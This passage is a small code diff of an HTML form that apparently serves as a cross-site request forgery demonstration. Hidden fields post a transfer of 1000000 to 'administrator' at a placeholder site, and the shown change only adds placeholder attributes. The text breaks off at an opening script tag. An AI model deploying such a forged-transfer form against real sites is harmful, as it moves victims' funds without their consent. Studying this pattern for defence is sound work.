@@ -1,6 +1,6 @@
 <form action="https://votre-site.com/transfer/" method="post">
-    <input type="hidden" name="recipient" value="administrator">
-    <input type="hidden" name="amount" value="1000000">
+    <input type="hidden" name="recipient" value="administrator" placeholder="administrator">
+    <input type="hidden" name="amount" value="1000000" placeholder="1000000">
     <button type="submit">Send</button>
 </form>
 <script>
